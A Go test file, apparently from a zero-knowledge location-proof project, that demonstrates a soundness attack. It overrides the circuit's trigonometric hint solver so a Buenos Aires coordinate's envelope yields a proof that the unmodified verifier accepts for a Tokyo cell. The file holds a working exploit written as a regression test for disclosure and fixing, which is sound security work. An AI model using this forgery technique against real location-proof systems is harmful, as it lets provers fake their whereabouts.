package main

import (
	"bytes"
	"encoding/base64"
	"math"
	"math/big"
	"path/filepath"
	"strings"
	"testing"

	"github.com/consensys/gnark-crypto/ecc"
	"github.com/consensys/gnark/backend"
	"github.com/consensys/gnark/backend/groth16"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/tumberger/zk-Location/hint"
	"github.com/tumberger/zk-Location/loc2index32"
)

// Security analysis, attack A1. The circuit opens the envelope with the real
// coordinate but computes the cell only from the trigonometric hints, and it checks the
// hints against each other, never against the coordinate. A prover that knows
// the secrets can keep the honest envelope and feed the hints of any other
// coordinate. This test passes while the attack works; the fix should make the
// forged proof fail.
func TestAttackForgedHintsProveAnotherCell(t *testing.T) {
	params := t.TempDir()
	if _, err := call(t, "", "setup", "--params", params); err != nil {
		t.Fatal(err)
	}

	honest := secrets{
		coordinate: coordinate{Latitude: -34.5478, Longitude: -58.4462},
		Salt:       "0x" + strings.Repeat("0", 63) + "1",
	}
	lat, lng, salt, err := honest.parse()
	if err != nil {
		t.Fatal(err)
	}
	envelope, err := loc2index32.NativeEnvelope(lat, lng, salt)
	if err != nil {
		t.Fatal(err)
	}

	// Tokyo Station, about 18,000 km from the honest coordinate in Buenos Aires.
	tokyoLat, tokyoLng := radians(35.6812), radians(139.7671)
	target, err := regionOf(cellAt(tokyoLat, tokyoLng, 7).String())
	if err != nil {
		t.Fatal(err)
	}

	// The honest CLI refuses to prove the Tokyo cell for this coordinate. That
	// check runs outside the circuit, so it does not bind a dishonest prover.
	secretsJSON := `{"latitude": -34.5478, "longitude": -58.4462, "salt": "` + honest.Salt + `"}`
	if _, err := call(t, secretsJSON, "prove", "--params", params, "--cell", target.Cell); err == nil {
		t.Fatal("the honest prover accepted a coordinate outside the cell")
	}

	// Same circuit and proving key as the honest prover. Only the hint solver
	// changes: it answers for the Tokyo coordinate instead of the real one.
	swap := map[uint64]uint64{
		uint64(lat): uint64(math.Float32bits(tokyoLat)),
		uint64(lng): uint64(math.Float32bits(tokyoLng)),
	}
	forgedHint := func(field *big.Int, in, out []*big.Int) error {
		if bits, ok := swap[in[0].Uint64()]; ok {
			in = append([]*big.Int{new(big.Int).SetUint64(bits)}, in[1:]...)
		}
		return hint.PrecomputeHint32(field, in, out)
	}

	circuit := groth16.NewCS(ecc.BN254)
	if err := readArtifact(filepath.Join(params, circuitFile), circuit); err != nil {
		t.Fatal(err)
	}
	provingKey := groth16.NewProvingKey(ecc.BN254)
	if err := readArtifact(filepath.Join(params, provingKeyFile), provingKey); err != nil {
		t.Fatal(err)
	}
	witness, err := frontend.NewWitness(&loc2index32.Circuit{
		Lat: lat, Lng: lng, Salt: salt, Envelope: envelope,
		Resolution: target.Resolution, Face: target.Face, I: target.I, J: target.J, K: target.K,
	}, ecc.BN254.ScalarField())
	if err != nil {
		t.Fatal(err)
	}
	proof, err := groth16.Prove(circuit, provingKey, witness,
		backend.WithSolverOptions(solver.OverrideHint(solver.GetHintID(hint.PrecomputeHint32), forgedHint)))
	if err != nil {
		t.Fatalf("the forged proof did not build: %v", err)
	}
	var encoded bytes.Buffer
	if _, err := proof.WriteTo(&encoded); err != nil {
		t.Fatal(err)
	}

	// The unmodified verify command accepts the honest envelope for Tokyo.
	if _, err := call(t, "", "verify", "--params", params, "--cell", target.Cell,
		"--envelope", formatScalar(envelope), "--proof", base64.StdEncoding.EncodeToString(encoded.Bytes())); err != nil {
		t.Fatalf("the verifier rejected the forged proof: %v", err)
	}
	t.Logf("accepted: envelope %s of a Buenos Aires coordinate verified for Tokyo cell %s", formatScalar(envelope), target.Cell)
}
